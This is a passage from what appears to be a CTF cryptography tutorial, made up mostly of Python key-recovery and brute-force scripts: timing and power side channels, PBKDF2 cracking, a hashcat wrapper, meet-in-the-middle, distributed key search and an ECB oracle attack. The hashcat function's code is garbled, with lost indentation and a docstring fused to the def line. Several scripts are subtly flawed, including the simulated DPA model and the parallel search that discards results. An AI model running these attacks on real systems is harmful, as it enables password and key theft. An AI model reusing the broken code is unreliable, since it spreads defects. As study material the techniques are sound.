    d_high = f.small_roots(X=2^(n.bit_length() - known_bits), beta=0.5)
    
    if d_high:
        d = int(d_high[0]) * (2^known_bits) + partial_d
        return d
    
    return None

# Example usage
n = 0x00d0f4e4cf68c55976e7c2419f3e6c1be7c8f3e4d5a6b7c8d9e0f1a2b3c4d5e6f7
e = 65537
partial_d_low = 0x1234567890abcdef  # Known lower 64 bits
known_bits = 64

# [Unverified] Recovery success depends on number of known bits
# d = recover_rsa_from_partial_d(n, e, partial_d_low, known_bits)
```

**Scenario: AES with Partial Key Bytes**

python

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import itertools

def recover_aes_partial_key(ciphertext, known_plaintext, partial_key, unknown_positions):
    """
    Brute force unknown bytes in AES key
    
    Args:
        ciphertext: encrypted data
        known_plaintext: known plaintext (for verification)
        partial_key: key with some bytes known (use None for unknown)
        unknown_positions: list of indices with unknown bytes
    """
    key_length = len(partial_key)
    num_unknown = len(unknown_positions)
    
    print(f"[*] Brute forcing {num_unknown} unknown key bytes ({2**(8*num_unknown)} combinations)")
    
    # Generate all possible values for unknown bytes
    for candidate_bytes in itertools.product(range(256), repeat=num_unknown):
        # Build test key
        test_key = bytearray(partial_key)
        for i, pos in enumerate(unknown_positions):
            test_key[pos] = candidate_bytes[i]
        
        try:
            cipher = AES.new(bytes(test_key), AES.MODE_ECB)
            plaintext = cipher.decrypt(ciphertext)
            
            # Verify against known plaintext
            if plaintext[:len(known_plaintext)] == known_plaintext:
                print(f"[+] Key found: {test_key.hex()}")
                return bytes(test_key)
        except:
            continue
    
    return None

# Example: 14 of 16 bytes known
partial_key = bytearray(b'secretkey1234' + b'\x00\x00')  # Last 2 bytes unknown
unknown_positions = [14, 15]
ciphertext = bytes.fromhex('...')  # Challenge ciphertext
known_plaintext = b'flag{'

# key = recover_aes_partial_key(ciphertext, known_plaintext, partial_key, unknown_positions)
```

**Scenario: XOR Key with Known Prefix/Suffix**

python

```python
def recover_xor_key_partial(ciphertext, plaintext_fragment, fragment_offset):
    """
    Recover XOR key when part of plaintext is known
    
    Args:
        ciphertext: full ciphertext
        plaintext_fragment: known plaintext segment
        fragment_offset: position of known plaintext in message
    """
    # Extract key bytes from known plaintext section
    key_fragment = bytes([c ^ p for c, p in zip(
        ciphertext[fragment_offset:fragment_offset + len(plaintext_fragment)],
        plaintext_fragment
    )])
    
    print(f"[+] Recovered key fragment: {key_fragment.hex()}")
    
    # If key is repeating, determine key length
    # Try different key lengths
    for key_len in range(len(key_fragment), len(ciphertext)):
        if key_len % len(key_fragment) == 0:
            # Extend key by repetition
            full_key = (key_fragment * (key_len // len(key_fragment) + 1))[:key_len]
            
            # Decrypt and check for readable text
            plaintext = bytes([c ^ k for c, k in zip(ciphertext, full_key)])
            
            # Simple heuristic: check for printable characters
            if all(32 <= b < 127 or b in [9, 10, 13] for b in plaintext):
                print(f"[+] Possible key length: {key_len}")
                print(f"[+] Full key: {full_key[:key_len].hex()}")
                print(f"[+] Plaintext: {plaintext.decode('ascii', errors='ignore')}")
                return full_key[:key_len]
    
    return None

# Example
ciphertext = bytes.fromhex('1c0e1f0a1b5c0e1f0a...')
known_text = b'CTF{'  # Flags often start with this
offset = 0

# key = recover_xor_key_partial(ciphertext, known_text, offset)
```

#### Leaked Key Material from Side Channels

**Scenario: Timing Attack Key Recovery**

python

```python
import time
import statistics

def timing_based_key_recovery(oracle_function, key_space):
    """
    Recover key by analyzing timing differences in oracle responses
    
    Args:
        oracle_function: function that validates key (returns True/False)
        key_space: possible key values to test
    """
    timing_data = {}
    
    for candidate_key in key_space:
        timings = []
        
        # Multiple measurements for statistical significance
        for _ in range(100):
            start = time.perf_counter()
            result = oracle_function(candidate_key)
            end = time.perf_counter()
            timings.append(end - start)
        
        avg_time = statistics.mean(timings)
        std_dev = statistics.stdev(timings)
        
        timing_data[candidate_key] = {
            'avg': avg_time,
            'std': std_dev,
            'result': result
        }
    
    # [Inference] Correct key typically shows different timing pattern
    # Sort by timing (slower often means more processing = partial match)
    sorted_keys = sorted(timing_data.items(), key=lambda x: x[1]['avg'], reverse=True)
    
    print("[*] Top timing candidates:")
    for key, data in sorted_keys[:5]:
        print(f"  Key: {key}, Avg: {data['avg']:.6f}s, StdDev: {data['std']:.6f}s")
    
    return sorted_keys[0][0]

# Example: Byte-by-byte timing attack on PIN
def pin_oracle(pin):
    """Simulated oracle with timing leak"""
    correct_pin = "1234"
    time.sleep(0.001)  # Base delay
    
    for i, digit in enumerate(pin):
        if i >= len(correct_pin):
            return False
        if digit != correct_pin[i]:
            return False
        time.sleep(0.0001)  # Extra delay for each correct digit
    
    return True

# Byte-by-byte recovery
def recover_pin_bytewise(length=4):
    recovered = ""
    
    for position in range(length):
        best_digit = None
        best_time = 0
        
        for digit in '0123456789':
            test_pin = recovered + digit + '0' * (length - position - 1)
            
            timings = []
            for _ in range(50):
                start = time.perf_counter()
                pin_oracle(test_pin)
                end = time.perf_counter()
                timings.append(end - start)
            
            avg_time = statistics.mean(timings)
            
            if avg_time > best_time:
                best_time = avg_time
                best_digit = digit
        
        recovered += best_digit
        print(f"[+] Position {position}: {best_digit} (time: {best_time:.6f}s)")
    
    return recovered

# pin = recover_pin_bytewise()
```

**Scenario: Power Analysis Side Channel**

python

```python
import numpy as np

def simulated_power_trace(key_byte, plaintext_byte):
    """
    [Inference] Simulate power consumption during AES S-box lookup
    Real traces require hardware measurement equipment
    """
    # AES S-box (first row for demonstration)
    sbox = [
        0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5,
        0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76
    ]
    
    # Intermediate value
    intermediate = plaintext_byte ^ key_byte
    sbox_output = sbox[intermediate % 16]  # Simplified
    
    # Power consumption proportional to Hamming weight
    hamming_weight = bin(sbox_output).count('1')
    
    # Add noise
    noise = np.random.normal(0, 0.5)
    power = hamming_weight + noise
    
    return power

def differential_power_analysis(power_traces, plaintexts, byte_position):
    """
    Recover key byte using DPA
    
    Args:
        power_traces: list of power consumption measurements
        plaintexts: corresponding plaintext values
        byte_position: which key byte to recover (0-15)
    """
    best_key_candidate = None
    best_correlation = 0
    
    for key_guess in range(256):
        # Hypothetical power consumption for this key guess
        hypothetical_power = []
        
        for plaintext in plaintexts:
            pt_byte = plaintext[byte_position]
            power = simulated_power_trace(key_guess, pt_byte)
            hypothetical_power.append(power)
        
        # Calculate correlation with actual traces
        correlation = np.corrcoef(hypothetical_power, power_traces)[0, 1]
        
        if abs(correlation) > abs(best_correlation):
            best_correlation = correlation
            best_key_candidate = key_guess
    
    print(f"[+] Key byte {byte_position}: 0x{best_key_candidate:02x} (correlation: {best_correlation:.4f})")
    return best_key_candidate

# Example usage (simulated)
num_traces = 1000
plaintexts = [bytes([np.random.randint(0, 256) for _ in range(16)]) for _ in range(num_traces)]
# [Unverified] Real power traces would come from oscilloscope measurements
# power_traces = [measure_power(pt) for pt in plaintexts]
```

#### Key Derivation Information Leaks

**Scenario: Weak Key Derivation Function**

python

```python
import hashlib
import itertools

def recover_pbkdf2_weak_params(hash_output, salt, known_password_chars, min_length, max_length, iterations):
    """
    Recover password when PBKDF2 parameters are weak
    
    Args:
        hash_output: target PBKDF2 output
        salt: known salt value
        known_password_chars: character set used in password
        min_length, max_length: password length bounds
        iterations: PBKDF2 iteration count
    """
    from Crypto.Protocol.KDF import PBKDF2
    
    print(f"[*] Testing passwords length {min_length}-{max_length}")
    print(f"[*] Character set: {known_password_chars}")
    
    for length in range(min_length, max_length + 1):
        for password_tuple in itertools.product(known_password_chars, repeat=length):
            password = ''.join(password_tuple).encode()
            
            derived_key = PBKDF2(password, salt, dkLen=len(hash_output), count=iterations)
            
            if derived_key == hash_output:
                print(f"[+] Password found: {password.decode()}")
                return password.decode()
    
    return None

# Example: weak iteration count and short password
salt = b'ctf_salt_2024'
target_hash = bytes.fromhex('...')
charset = 'abcdefghijklmnopqrstuvwxyz0123456789'

# [Inference] Success depends on password complexity and iteration count
# password = recover_pbkdf2_weak_params(target_hash, salt, charset, 4, 6, 1000)
```

**Scenario: Deterministic Key Generation**

python

```python
import hashlib

def recover_deterministic_key(known_seed_partial, seed_length, ciphertext, known_plaintext):
    """
    Recover key when generated from predictable seed (e.g., timestamp, counter)
    
    Args:
        known_seed_partial: known part of seed (e.g., date without time)
        seed_length: total seed length
        ciphertext: encrypted data
        known_plaintext: known plaintext fragment
    """
    from Crypto.Cipher import AES
    from Crypto.Hash import SHA256
    
    # Example: seed is timestamp within known range
    # Seed format: YYYYMMDD_HHMMSS
    date_part = known_seed_partial  # e.g., "20240115_"
    
    for hour in range(24):
        for minute in range(60):
            for second in range(60):
                seed = f"{date_part}{hour:02d}{minute:02d}{second:02d}"
                
                # Generate key from seed
                key = SHA256.new(seed.encode()).digest()[:16]  # AES-128
                
                try:
                    cipher = AES.new(key, AES.MODE_ECB)
                    plaintext = cipher.decrypt(ciphertext[:16])
                    
                    if plaintext[:len(known_plaintext)] == known_plaintext:
                        print(f"[+] Seed found: {seed}")
                        print(f"[+] Key: {key.hex()}")
                        return key
                except:
                    continue
    
    return None

# Example usage
known_date = "20240115_"  # Know date, not time
ciphertext = bytes.fromhex('...')
known_start = b'flag{'

# key = recover_deterministic_key(known_date, 16, ciphertext, known_start)
```

### Brute-Force Keyspace Reduction

Techniques to reduce cryptographic keyspace from infeasible to practical brute-force ranges.

#### Entropy Analysis

**Scenario: Low-Entropy Key Detection**

python

```python
import math
from collections import Counter

def calculate_entropy(data):
    """Calculate Shannon entropy of data"""
    if not data:
        return 0
    
    counter = Counter(data)
    length = len(data)
    
    entropy = 0
    for count in counter.values():
        probability = count / length
        entropy -= probability * math.log2(probability)
    
    return entropy

def analyze_key_entropy(key_samples):
    """
    Analyze entropy of key generation to identify weaknesses
    
    Args:
        key_samples: list of generated keys to analyze
    """
    print("[*] Analyzing key entropy...")
    
    # Positional entropy (each byte position)
    key_length = len(key_samples[0])
    positional_entropy = []
    
    for pos in range(key_length):
        bytes_at_pos = [key[pos] for key in key_samples]
        entropy = calculate_entropy(bytes_at_pos)
        positional_entropy.append(entropy)
        
        if entropy < 4.0:  # Low entropy threshold
            print(f"[!] Low entropy at position {pos}: {entropy:.2f} bits")
            unique_values = set(bytes_at_pos)
            print(f"    Unique values: {len(unique_values)}")
            print(f"    Most common: {Counter(bytes_at_pos).most_common(5)}")
    
    # Overall entropy
    all_bytes = [b for key in key_samples for b in key]
    overall = calculate_entropy(all_bytes)
    print(f"[*] Overall entropy: {overall:.2f} bits/byte (ideal: 8.0)")
    
    # Expected vs actual keyspace
    theoretical_keyspace = 256 ** key_length
    actual_unique_keys = len(set(tuple(k) for k in key_samples))
    print(f"[*] Unique keys in sample: {actual_unique_keys}/{len(key_samples)}")
    
    return positional_entropy

# Example: Analyze weak RNG output
def weak_key_generator(seed):
    """Simulated weak key generator"""
    import random
    random.seed(seed)
    
    # Weak: only uses lower 4 bits randomness
    return bytes([random.randint(0, 15) for _ in range(16)])

# Generate samples
samples = [weak_key_generator(i) for i in range(1000)]
# entropy_analysis = analyze_key_entropy(samples)
```

**Scenario: Character Set Reduction**

python

```python
import string

def detect_key_charset(ciphertext, plaintext_sample):
    """
    Determine key character set by analyzing encryption behavior
    
    Useful for reducing keyspace when key uses limited alphabet
    """
    # Test different character sets
    charsets = {
        'lowercase': string.ascii_lowercase,
        'uppercase': string.ascii_uppercase,
        'digits': string.digits,
        'alphanumeric': string.ascii_letters + string.digits,
        'printable': string.printable.strip(),
        'hex': '0123456789abcdef'
    }
    
    scores = {}
    
    for name, charset in charsets.items():
        # Try XOR with each character
        valid_count = 0
        
        for char in charset:
            result = bytes([c ^ ord(char) for c in ciphertext[:len(plaintext_sample)]])
            
            # Check if result is printable
            if all(32 <= b < 127 for b in result):
                valid_count += 1
        
        scores[name] = valid_count
        print(f"[*] Charset '{name}': {valid_count} valid results")
    
    # Best matching charset
    best = max(scores.items(), key=lambda x: x[1])
    print(f"[+] Likely charset: {best[0]}")
    
    return charsets[best[0]]

# Example
ct = bytes.fromhex('2c24311a3c')
pt_sample = b'flag{'

# charset = detect_key_charset(ct, pt_sample)
```

#### Pattern Recognition in Keys

**Scenario: Repeating Key Patterns**

python

```python
def find_key_period(ciphertext, known_plaintext_fragment, max_period=50):
    """
    Detect repeating key patterns (like Vigenère or repeating XOR)
    
    Args:
        ciphertext: encrypted data
        known_plaintext_fragment: known plaintext segment
        max_period: maximum key length to test
    """
    key_candidates = {}
    
    # Extract key fragment from known plaintext
    key_fragment = bytes([c ^ p for c, p in zip(ciphertext, known_plaintext_fragment)])
    frag_len = len(key_fragment)
    
    print(f"[*] Key fragment: {key_fragment.hex()}")
    
    # Test different periods
    for period in range(frag_len, min(max_period, len(ciphertext) // 2)):
        # Extend key by repetition
        extended_key = (key_fragment * ((period // frag_len) + 1))[:period]
        
        # Decrypt entire ciphertext
        plaintext = bytes([c ^ extended_key[i % period] for i, c in enumerate(ciphertext)])
        
        # Score based on printable characters
        printable_ratio = sum(32 <= b < 127 for b in plaintext) / len(plaintext)
        
        if printable_ratio > 0.9:  # High confidence threshold
            print(f"[+] Candidate key length: {period}")
            print(f"    Extended key: {extended_key.hex()}")
            print(f"    Printable ratio: {printable_ratio:.2%}")
            print(f"    Plaintext preview: {plaintext[:50]}")
            
            key_candidates[period] = extended_key
    
    return key_candidates

# Example
ciphertext = bytes.fromhex('1c0a1f081b491c0e1f0a1b5c0e1f0a1b591a0e1f')
known_start = b'The flag is: CTF{'

# candidates = find_key_period(ciphertext, known_start)
```

**Scenario: Predictable Key Structure**

python

```python
import re

def exploit_key_structure(key_format, known_parts, ciphertext, known_plaintext):
    """
    Exploit known key format to reduce search space
    
    Args:
        key_format: regex pattern for key structure
        known_parts: dictionary of known key components
        ciphertext: encrypted data
        known_plaintext: verification plaintext
    
    Example: Key format "USER####" where #### are digits
    """
    from Crypto.Cipher import AES
    from Crypto.Hash import SHA256
    import re
    
    # Parse format pattern
    # Example: "CTF2024_####" where #### is 4 hex digits
    
    if key_format == "CTF2024_????":  # 4 hex digits
        print("[*] Testing CTF2024_XXXX format (65536 combinations)")
        
        for i in range(0x10000):
            key_string = f"CTF2024_{i:04x}"
            key = SHA256.new(key_string.encode()).digest()[:16]
            
            try:
                cipher = AES.new(key, AES.MODE_ECB)
                plaintext = cipher.decrypt(ciphertext[:16])
                
                if plaintext[:len(known_plaintext)] == known_plaintext:
                    print(f"[+] Key found: {key_string}")
                    return key_string
            except:
                continue
    
    elif key_format == "YEAR_MONTH_DAY":
        # Date-based key: 2024-01-01 to 2024-12-31
        print("[*] Testing date-based keys (365 combinations)")
        
        for month in range(1, 13):
            for day in range(1, 32):
                key_string = f"2024-{month:02d}-{day:02d}"
                key = SHA256.new(key_string.encode()).digest()[:16]
                
                try:
                    cipher = AES.new(key, AES.MODE_ECB)
                    plaintext = cipher.decrypt(ciphertext[:16])
                    
                    if plaintext[:len(known_plaintext)] == known_plaintext:
                        print(f"[+] Key found: {key_string}")
                        return key_string
                except:
                    continue
    
    return None

# Example usage
ciphertext = bytes.fromhex('...')
known_text = b'flag{'

# key = exploit_key_structure("CTF2024_????", {}, ciphertext, known_text)
```

#### Meet-in-the-Middle Attacks

**Scenario: Double Encryption**

python

```python
def meet_in_the_middle_double_des(plaintext, ciphertext, keyspace_size=2**20):
    """
    Meet-in-the-middle attack on double encryption
    
    Reduces time complexity from O(n²) to O(n) with O(n) space
    
    Args:
        plaintext: known plaintext
        ciphertext: corresponding ciphertext  
        keyspace_size: reduced keyspace to search
    """
    from Crypto.Cipher import DES
    import random
    
    print(f"[*] Building forward encryption table ({keyspace_size} keys)...")
    
    # Forward table: plaintext -> intermediate (with key1)
    forward_table = {}
    
    for i in range(keyspace_size):
        # Generate candidate key1 (simplified: use counter as key material)
        key1 = i.to_bytes(8, 'big')[:8]
        
        try:
            cipher = DES.new(key1, DES.MODE_ECB)
            intermediate = cipher.encrypt(plaintext)
            forward_table[intermediate] = key1
        except:
            continue
        
        if i % 10000 == 0:
            print(f"  Progress: {i}/{keyspace_size}")
    
    print(f"[*] Searching backward from ciphertext ({keyspace_size} keys)...")
    
    # Backward table: ciphertext -> intermediate (with key2)
    for i in range(keyspace_size):
        key2 = i.to_bytes(8, 'big')[:8]
        
        try:
            cipher = DES.new(key2, DES.MODE_ECB)
            intermediate = cipher.decrypt(ciphertext)
            
            # Check for collision
            if intermediate in forward_table:
                key1 = forward_table[intermediate]
                print(f"[+] Keys found!")
                print(f"    Key1: {key1.hex()}")
                print(f"    Key2: {key2.hex()}")
                
                # Verify
                c1 = DES.new(key1, DES.MODE_ECB)
                c2 = DES.new(key2, DES.MODE_ECB)
                test_ct = c2.encrypt(c1.encrypt(plaintext))
                
                if test_ct == ciphertext:
                    return (key1, key2)
        except:
            continue
        
        if i % 10000 == 0:
            print(f"  Progress: {i}/{keyspace_size}")
    
    return None

# Example (simulated with reduced keyspace)
# pt = b'PLAINTXT'
# ct = b'\x8c\xa6\x4d\xe9\xc1\xb1\x23\xa7'
# keys = meet_in_the_middle_double_des(pt, ct, keyspace_size=2**16)
```

**Scenario: Cascaded Encryption with Known Intermediate**

python

```python
def attack_cascade_with_intermediate(plaintext, intermediate, ciphertext, keyspace):
    """
    Attack cascaded encryption when intermediate state is leaked
    
    E_k2(E_k1(plaintext)) = ciphertext
    If intermediate = E_k1(plaintext) is known, both keys can be recovered independently
    """
    from Crypto.Cipher import AES
    
    print("[*] Recovering key1 (plaintext -> intermediate)...")
    
    for key1_candidate in keyspace:
        cipher1 = AES.new(key1_candidate, AES.MODE_ECB)
        test_intermediate = cipher1.encrypt(plaintext)
        
        if test_intermediate == intermediate:
            print(f"[+] Key1 found: {key1_candidate.hex()}")
            
            # Now recover key2
            print("[*] Recovering key2 (intermediate -> ciphertext)...")
            
            for key2_candidate in keyspace:
                cipher2 = AES.new(key2_candidate, AES.MODE_ECB)
                test_ciphertext = cipher2.encrypt(intermediate)
                
                if test_ciphertext == ciphertext:
                    print(f"[+] Key2 found: {key2_candidate.hex()}")
                    return (key1_candidate, key2_candidate)
    
    return None

# [Inference] This attack demonstrates importance of hiding intermediate states
```

#### Parallel Brute-Force Optimization

**Scenario: Multi-Threaded Key Search**

python

```python
import multiprocessing as mp
from Crypto.Cipher import AES
import itertools

def test_key_batch(args):
    """Worker function to test a batch of keys"""
    key_batch, ciphertext, known_plaintext = args
    
    for key_bytes in key_batch:
        try:
            key = bytes(key_bytes)
            cipher = AES.new(key, AES.MODE_ECB)
            plaintext = cipher.decrypt(ciphertext[:16])
            
            if plaintext[:len(known_plaintext)] == known_plaintext:
                return key
        except:
            continue
    
    return None

def parallel_key_search(ciphertext, known_plaintext, key_charset, key_length, num_processes=None):
    """
    Parallel brute-force key search using all CPU cores
    
    Args:
        ciphertext: encrypted data
        known_plaintext: known plaintext for verification
        key_charset: possible key bytes (e.g., range(256))
        key_length: length of key in bytes
        num_processes: number of parallel workers (default: CPU count)
    """
    if num_processes is None:
        num_processes = mp.cpu_count()
    
    print(f"[*] Starting parallel search with {num_processes} processes")
    print(f"[*] Keyspace: {len(key_charset)}^{key_length} = {len(key_charset)**key_length}")
    
    # Generate all key combinations
    all_keys = itertools.product(key_charset, repeat=key_length)
    
    # Split into batches for parallel processing
    batch_size = 10000
    
    with mp.Pool(processes=num_processes) as pool:
        # Create batches
        while True:
            batch = list(itertools.islice(all_keys, batch_size))
            if not batch:
                break
            
            # Submit batch to worker pool
            result = pool.apply_async(test_key_batch, ((batch, ciphertext, known_plaintext),))
            
            # Check if key found
            try:
                found_key = result.get(timeout=0.1)
                if found_key:
                    print(f"[+] Key found: {found_key.hex()}")
                    pool.terminate()
                    return found_key
            except mp.TimeoutError:
                continue
    
    return None

# Example: 3-byte key from limited charset
# ct = bytes.fromhex('...')
# known = b'flag'
# charset = range(32, 127)  # Printable ASCII
# key = parallel_key_search(ct, known, charset, 3)
```

**Scenario: GPU-Accelerated Brute-Force**

python

```python
#!/usr/bin/env python3
"""
GPU-accelerated key search using hashcat

[Unverified] Requires proper hashcat installation and compatible GPU
"""

import subprocess
import os

def hashcat_bruteforce(hash_file, hash_type, charset, min_len, max_len): """ GPU-accelerated brute-force using hashcat

Args:
    hash_file: file containing hash to crack
    hash_type: hashcat hash mode (-m parameter)
    charset: character set to use
    min_len, max_len: password length range

Common hash types:
    0 = MD5
    100 = SHA1
    1400 = SHA256
    1700 = SHA512
    2500 = WPA/WPA2
"""

# Build hashcat command
cmd = [
    'hashcat',
    '-m', str(hash_type),
    '-a', '3',  # Brute-force attack
    hash_file,
    '--increment',
    '--increment-min', str(min_len),
    '--increment-max', str(max_len),
]

# Charset specification
if charset == 'lower':
    mask = '?l' * max_len
elif charset == 'upper':
    mask = '?u' * max_len
elif charset == 'digit':
    mask = '?d' * max_len
elif charset == 'alphanum':
    mask = '?a' * max_len
elif charset == 'hex':
    mask = '?h' * max_len
else:
    mask = charset

cmd.append(mask)

print(f"[*] Launching hashcat: {' '.join(cmd)}")

try:
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    # Parse output for cracked hash
    if "Cracked" in result.stdout:
        print("[+] Hash cracked!")
        # Extract password from potfile
        potfile = os.path.expanduser("~/.hashcat/hashcat.potfile")
        if os.path.exists(potfile):
            with open(potfile, 'r') as f:
                for line in f:
                    if hash_file in line:
                        password = line.split(':')[-1].strip()
                        print(f"[+] Password: {password}")
                        return password
    else:
        print("[-] Hash not cracked")
        
except FileNotFoundError:
    print("[!] Hashcat not found. Install with: apt install hashcat")

return None

# Example usage

"""

# Create hash file

echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt

# Crack MD5 with 4-6 digit password

password = hashcat_bruteforce('hash.txt', 0, 'digit', 4, 6) """
````

**Scenario: Distributed Brute-Force**
```python
import socket
import pickle
import threading

def distributed_coordinator(keyspace_chunks, worker_addresses, task_params):
    """
    Coordinator for distributed brute-force across multiple machines
    
    Args:
        keyspace_chunks: list of keyspace ranges to distribute
        worker_addresses: list of (host, port) tuples for workers
        task_params: parameters to send to workers (ciphertext, etc.)
    """
    results_queue = []
    found_event = threading.Event()
    
    def send_task_to_worker(worker_addr, chunk):
        """Send keyspace chunk to worker"""
        host, port = worker_addr
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            
            # Send task
            task = {
                'keyspace_chunk': chunk,
                'params': task_params
            }
            sock.sendall(pickle.dumps(task))
            
            # Wait for result
            result = pickle.loads(sock.recv(4096))
            
            if result.get('found'):
                print(f"[+] Worker {host}:{port} found key: {result['key']}")
                found_event.set()
                results_queue.append(result)
            
            sock.close()
            
        except Exception as e:
            print(f"[!] Error with worker {host}:{port}: {e}")
    
    # Distribute tasks
    threads = []
    for i, (worker, chunk) in enumerate(zip(worker_addresses, keyspace_chunks)):
        if found_event.is_set():
            break
        
        print(f"[*] Assigning chunk {i} to worker {worker}")
        t = threading.Thread(target=send_task_to_worker, args=(worker, chunk))
        t.start()
        threads.append(t)
    
    # Wait for completion
    for t in threads:
        t.join()
    
    if results_queue:
        return results_queue[0]['key']
    return None

def distributed_worker(listen_port):
    """
    Worker node that receives keyspace chunks and searches
    
    Run on each worker machine
    """
    from Crypto.Cipher import AES
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('0.0.0.0', listen_port))
    sock.listen(1)
    
    print(f"[*] Worker listening on port {listen_port}")
    
    while True:
        conn, addr = sock.accept()
        print(f"[*] Connection from {addr}")
        
        # Receive task
        task = pickle.loads(conn.recv(4096))
        keyspace_chunk = task['keyspace_chunk']
        params = task['params']
        
        ciphertext = params['ciphertext']
        known_plaintext = params['known_plaintext']
        
        # Search assigned keyspace
        print(f"[*] Searching keyspace chunk: {len(keyspace_chunk)} keys")
        
        for key_candidate in keyspace_chunk:
            try:
                cipher = AES.new(key_candidate, AES.MODE_ECB)
                plaintext = cipher.decrypt(ciphertext[:16])
                
                if plaintext[:len(known_plaintext)] == known_plaintext:
                    result = {'found': True, 'key': key_candidate.hex()}
                    conn.sendall(pickle.dumps(result))
                    return
            except:
                continue
        
        # Not found in this chunk
        result = {'found': False}
        conn.sendall(pickle.dumps(result))
        conn.close()

# Example usage (coordinator)
"""
# Split keyspace into chunks
keyspace = [bytes([a, b, c]) for a in range(256) for b in range(256) for c in range(256)]
chunk_size = len(keyspace) // 4  # 4 workers
chunks = [keyspace[i:i+chunk_size] for i in range(0, len(keyspace), chunk_size)]

# Worker machines
workers = [
    ('192.168.1.10', 9999),
    ('192.168.1.11', 9999),
    ('192.168.1.12', 9999),
    ('192.168.1.13', 9999)
]

params = {
    'ciphertext': bytes.fromhex('...'),
    'known_plaintext': b'flag{'
}

key = distributed_coordinator(chunks, workers, params)
"""
````

### Pattern-Based Key Inference

Extracting keys by identifying patterns in encryption behavior, implementation details, or mathematical relationships.

#### Statistical Pattern Analysis

**Scenario: Frequency Analysis for Key Recovery**

python

```python
from collections import Counter
import string

def frequency_analysis_xor_key(ciphertext, expected_language='english'):
    """
    Recover XOR key using frequency analysis
    
    Assumes plaintext is natural language text
    """
    # Expected character frequencies (English)
    english_freq = {
        'e': 12.70, 't': 9.06, 'a': 8.17, 'o': 7.51, 'i': 6.97,
        'n': 6.75, 's': 6.33, 'h': 6.09, 'r': 5.99, ' ': 13.0
    }
    
    print("[*] Analyzing ciphertext frequency patterns...")
    
    # Try each possible single-byte XOR key
    candidates = []
    
    for key_byte in range(256):
        decrypted = bytes([b ^ key_byte for b in ciphertext])
        
        # Count character frequencies
        text = decrypted.lower()
        counter = Counter(chr(b) for b in text if 32 <= b < 127)
        
        if not counter:
            continue
        
        # Calculate chi-squared statistic
        chi_squared = 0
        total_chars = sum(counter.values())
        
        for char, expected_freq in english_freq.items():
            observed = counter.get(char, 0)
            expected = (expected_freq / 100.0) * total_chars
            
            if expected > 0:
                chi_squared += ((observed - expected) ** 2) / expected
        
        # Lower chi-squared = better match to English
        candidates.append((key_byte, chi_squared, decrypted))
    
    # Sort by chi-squared (best match first)
    candidates.sort(key=lambda x: x[1])
    
    print("[*] Top candidates:")
    for i, (key, score, plaintext) in enumerate(candidates[:5]):
        preview = plaintext[:60].decode('ascii', errors='ignore')
        print(f"  {i+1}. Key: 0x{key:02x} ({chr(key) if 32 <= key < 127 else '?'}), Score: {score:.2f}")
        print(f"     Preview: {preview}")
    
    return candidates[0][0]  # Return most likely key

# Example
ciphertext = bytes.fromhex('1b5b545b5958081b565d5c5b08585d5c')
# key = frequency_analysis_xor_key(ciphertext)
```

**Scenario: Index of Coincidence for Key Length**

python

```python
def index_of_coincidence(text):
    """Calculate IC (Index of Coincidence) for text"""
    n = len(text)
    if n <= 1:
        return 0
    
    freq = Counter(text)
    ic = sum(f * (f - 1) for f in freq.values()) / (n * (n - 1))
    return ic

def find_repeating_key_length(ciphertext, max_length=30):
    """
    Determine repeating key length using Index of Coincidence
    
    IC for English: ~0.067
    IC for random: ~0.038
    """
    print("[*] Calculating IC for different key lengths...")
    
    ic_scores = {}
    
    for key_len in range(1, max_length + 1):
        # Split ciphertext into key_len groups
        groups = [ciphertext[i::key_len] for i in range(key_len)]
        
        # Calculate average IC across groups
        avg_ic = sum(index_of_coincidence(group) for group in groups) / key_len
        ic_scores[key_len] = avg_ic
        
        if avg_ic > 0.06:  # Close to English IC
            print(f"  Key length {key_len}: IC = {avg_ic:.4f} ***")
        else:
            print(f"  Key length {key_len}: IC = {avg_ic:.4f}")
    
    # Find key length with IC closest to English
    best_length = max(ic_scores.items(), key=lambda x: x[1])[0]
    print(f"[+] Most likely key length: {best_length}")
    
    return best_length

def recover_vigenere_key(ciphertext, key_length):
    """
    Recover Vigenère key using frequency analysis on each position
    """
    key = []
    
    for pos in range(key_length):
        # Extract bytes at this position
        subtext = ciphertext[pos::key_length]
        
        # Frequency analysis on subtext
        best_key_byte = frequency_analysis_xor_key(subtext)
        key.append(best_key_byte)
        
        print(f"[+] Position {pos}: 0x{best_key_byte:02x} ({chr(best_key_byte) if 32 <= best_key_byte < 127 else '?'})")
    
    return bytes(key)

# Example usage
"""
ct = bytes.fromhex('...')
key_len = find_repeating_key_length(ct)
key = recover_vigenere_key(ct, key_len)
"""
```

#### Implementation Flaw Patterns

**Scenario: ECB Mode Byte-at-a-Time Oracle**

python

```python
def ecb_oracle_attack(encryption_oracle, block_size=16):
    """
    Byte-at-a-time ECB decryption attack
    
    Args:
        encryption_oracle: function that encrypts controlled_input + secret
    
    Returns:
        Recovered secret data
    """
    print("[*] Starting ECB byte-at-a-time attack...")
    
    # Determine block size (if not known)
    # Feed increasing lengths and observe output growth
    
    # Recover secret byte by byte
    secret = b""
    
    while True:
        # Calculate padding needed
        padding_len = block_size - 1 - (len(secret) % block_size)
        padding = b'A' * padding_len
        
        # Encrypt with padding
        target_block_num = len(secret) // block_size
        ciphertext = encryption_oracle(padding)
        target_block = ciphertext[target_block_num * block_size:(target_block_num + 1) * block_size]
        
        # Build dictionary of possible next bytes
        found = False
        for byte_val in range(256):
            test_input = padding + secret + bytes([byte_val])
            test_ct = encryption_oracle(test_input)
            test_block = test_ct[target_block_num * block_size:(target_block_num + 1) * block_size]
            
            if test_block == target_block:
                secret += bytes([byte_val])
                print(f"[+] Recovered byte {len(secret)}: 0x{byte_val:02x} ({chr(byte_val) if 32 <= byte_val < 127 else '?'})")
                found = True
                break
        
        if not found:
            print("[*] Attack complete or padding reached")
            break
        
        # Check for padding/end
        if len(secret) > 0 and secret[-1] < 32:
            break
    
    return secret

# Example oracle
"""
SECRET = b"flag{secret_data_here}"

def oracle(user_input):
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    
    KEY = b'sixteen_byte_key'
